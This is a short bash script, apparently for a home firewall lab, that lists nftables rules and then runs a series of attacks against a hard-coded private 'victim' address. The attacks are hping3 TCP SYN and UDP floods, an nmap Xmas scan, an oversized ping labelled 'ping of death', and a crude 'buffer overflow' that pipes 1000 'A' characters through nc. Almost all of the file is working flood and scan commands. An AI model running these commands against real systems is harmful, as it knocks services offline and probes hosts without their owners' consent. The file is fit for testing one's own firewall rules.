#!/bin/bash

victim_ip="192.168.50.98"

# Check if the script is running as root
if [ "$EUID" -ne 0 ]; then
  echo "This script must be run as root. Re-running with sudo..."
  sudo "$0" "$@"
  exit
fi

##list all tables
echo "Listing all nftables rules:"
nft list ruleset ## use "nft list tables" if you want to see the tables without the rules

## TCP SYN flood attack
echo "Starting TCP SYN flood attack on $victim_ip:"
hping3 -S -p 80 --flood $victim_ip

## UDP flood attack
echo "Starting UDP flood attack on $victim_ip:"
hping3 --udp -p 53 --flood $victim_ip

## Xmas Nmap scan
echo "Starting Xmas Nmap scan on $victim_ip:"
nmap -sX $victim_ip

## Ping of death
echo "Starting ping of death attack on $victim_ip:"
ping -s 65500 $victim_ip

## Buffer overflow attack
echo "Starting buffer overflow attack on $victim_ip:"
python3 -c 'print("A" * 1000)' | nc $victim_ip 1234
